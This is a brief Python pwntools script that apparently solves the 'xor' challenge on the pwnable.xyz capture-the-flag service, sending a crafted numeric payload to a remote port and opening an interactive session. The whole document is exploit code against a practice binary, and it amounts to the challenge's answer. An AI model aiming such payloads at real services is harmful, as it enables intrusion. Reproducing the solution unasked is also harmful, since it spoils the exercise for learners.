from pwn import *
p = remote("svc.pwnable.xyz", 30029)
#p = process("./xor")
pause()
elf = ELF("./xor")
payload = ("1 "+str(1099511606505)+ " -" + "262898")
p.sendline(payload)
p.interactive()
